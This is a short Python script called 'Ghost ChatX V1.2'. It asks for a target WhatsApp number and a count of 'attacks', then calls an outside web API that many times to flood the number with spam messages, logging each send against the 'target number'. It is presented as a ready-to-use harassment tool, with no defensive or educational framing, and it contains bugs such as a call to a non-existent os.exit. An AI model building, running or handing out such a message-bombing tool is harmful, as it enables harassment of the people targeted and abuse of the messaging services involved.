import requests
import os
import sys
import time

#CODE BY ALVIAN DWI SYAHPUTRA XI TKJ II

url = "https://aink-sanz.herokuapp.com/api/free-tutorial-spam-wa"

def __optional__():
    os.system("clear")
    os.system("echo -ne '\033]0;Ghost ChatX V1.2\007'")


def __main__():
    __optional__()
    print("\nSelect Language To Start Program\n\n   [1] English\n   [2] Indonesia\n\nDefault (English)\n\n")
    league = raw_input("Choose > ")
    if league == "01" or league == "1" or league == "en":
        phone_en = raw_input("\n[?] WhatsApp Number > ")
        att_en = input("[?] Number of Attacks > ")
        time.sleep(1)
        print("\nWaiting To Run Attack\n")
        
        data_en = {
            "nomor":phone_en
        }
        
        for a in range(att_en):
            TheXploit_en = requests.get(url, params=data_en)
            if "Berhasil Ngab ! .. Subrek Yt FREE TUTORIAL." in TheXploit_en.text:
                print("[+] GhostChatX Successfully Sent...")
                log_en = "[+] GhostChatX Successfully Sent To Target Number : {}\n".format(phone_en)
                file_log_en = open("GhostChatX.log", "a")
                file_log_en.write(log_en)
                file_log_en.close()
            else:
                print("[-] GhostChatX Send Failed...")
                log_fail_en = "[-] GhostChatX Failed to Send To Target Number : {}\n".format(phone_en)
                file_log_fail_en = open("GhostChatX.log", "a")
                file_log_fail_en.write(log_fail_en)
                file_log_fail_en.close()
                os.exit(1)
                
    elif league == "02" or league == "2" or league == "id":
        phone_id = raw_input("\n[?] Nomor WhatsApp > ")
        att_id = input("[?] Jumlah Serangan > ")
        time.sleep(1)
        print("\nMenunggu Untuk Memulai Serangan...\n")
        
        data_id = {
            "nomor":phone_id
        }
        
        for b in range(att_id):
            TheXploit_id = requests.get(url, params=data_id)
            if "Berhasil Ngab ! .. Subrek Yt FREE TUTORIAL." in TheXploit_id.text:
                print("[+] GhostChatX Berhasil Terkirim...")
                log_id = "[+] GhostChatX Berhasil Dikirim Ke Nomor Target : {}\n".format(phone_id)
                file_log_id = open("GhostChatX.log", "a")
                file_log_id.write(log_id)
                file_log_id.close()
            else:
                print("[-] Pengiriman Gagal...")
                log_fail_id = "[-] Gagal Mengirim Ke Nomor Target : {}\n".format(phone_id)
                file_log_fail_id = open("GhostChatX.log", "a")
                file_log_fail_id.write(log_fail_id)
                file_log_fail_id.close()
                os.exit(1)
        
__main__()
